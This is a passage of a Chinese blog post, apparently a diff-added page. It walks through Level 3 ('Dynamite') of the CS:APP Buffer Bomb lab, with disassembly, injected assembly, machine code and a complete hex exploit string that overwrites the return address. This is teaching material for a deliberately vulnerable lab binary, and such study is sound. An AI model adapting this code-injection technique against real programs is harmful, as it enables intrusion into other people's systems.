-0xc(%ebp),%edx</span><br><span class="line"> 8048cb3:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048cb8:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048cba:	75 22                	jne    8048cde &lt;test+0x64&gt;</span><br><span class="line"> 8048cbc:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048cbf:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048cc2:	68 f9 a3 04 08       	push   $0x804a3f9</span><br><span class="line"> 8048cc7:	e8 74 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048ccc:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048ccf:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048cd2:	6a 03                	push   $0x3</span><br><span class="line"> 8048cd4:	e8 e6 07 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048cd9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cdc:	eb 13                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cde:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ce1:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048ce4:	68 16 a4 04 08       	push   $0x804a416</span><br><span class="line"> 8048ce9:	e8 52 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048cee:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cf1:	90                   	nop</span><br><span class="line"> 8048cf2:	c9                   	leave  </span><br><span class="line"> 8048cf3:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>可以看到调用<code>getbuf</code>后，返回值被储存在<code>%eax</code>中，于是我们只要修改<code>%eax</code>的值为我们的<code>cookie</code>即可，同时要求复原<code>%ebp</code>，那么我们在调用<code>getbuf</code>记住<code>%ebp</code>的值，再执行我们的语句时重新赋给<code>%ebp</code>即可，我们先在调用<code>getbuf</code>前设置断点，查看<code>%ebp</code>的值</p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631621.png" alt="image-20211225180505432"></p>
+<p>可见<code>%ebp</code>的值为<code>0x55682fb0</code>，整理一下我们的任务</p>
+<ul>
+<li>设置<code>%eax</code>为我们的<code>cookie</code> <code>0x73413ee0</code></li>
+<li>设置<code>%ebp</code>为初始值<code>0x55682fb0</code></li>
+<li>回到<code>test</code>函数中调用<code>getbuf</code>后的下一个语句地址<code>0x8048c8d</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, %eax</span><br><span class="line">movl $0x55682fb0, %ebp</span><br><span class="line">push $0x8048c8d</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 e0 3e 41 73       	mov    $0x73413ee0,%eax</span><br><span class="line">   5:	bd b0 2f 68 55       	mov    $0x55682fb0,%ebp</span><br><span class="line">   a:	68 8d 8c 04 08       	push   $0x8048c8d</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>接着步骤和之前相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b8 e0 3e 41 73 </span><br><span class="line">bd b0 2f 68 55 </span><br><span class="line">68 8d 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631622.png" alt="image-20211225181341091" style="zoom:80%;" /></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" rel="tag"># 汇编语言</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/20/%E8%A7%A6%E5%8F%91%E5%99%A8/" rel="prev" title="触发器">
+      <i class="fa fa-chevron-left"></i> 触发器
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDg0NC8zMTMxMw=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#the-Buffer-Bomb"><span class="nav-number">1.</span> <span class="nav-text">the Buffer Bomb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E5%85%88%E5%87%86%E5%A4%87"><span class="nav-number">1.1.</span> <span class="nav-text">事先准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-0-Candle"><span class="nav-number">1.2.</span> <span class="nav-text">Level 0: Candle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1-Sparkler"><span class="nav-number">1.3.</span> <span class="nav-text">Level 1: Sparkler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2-Firecracker"><span class="nav-number">1.4.</span> <span class="nav-text">Level 2: Firecracker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3-Dynamite"><span class="nav-number">1.5.</span> <span class="nav-text">Level 3: Dynamite</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Existo"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Existo</p>
+  <div class="site-description" itemprop="description">Hello Nerd</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ExistoT01" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ExistoT01" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1x6tot01@gmail.com" title="E-Mail → mailto:1x6tot01@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-11 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Existo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
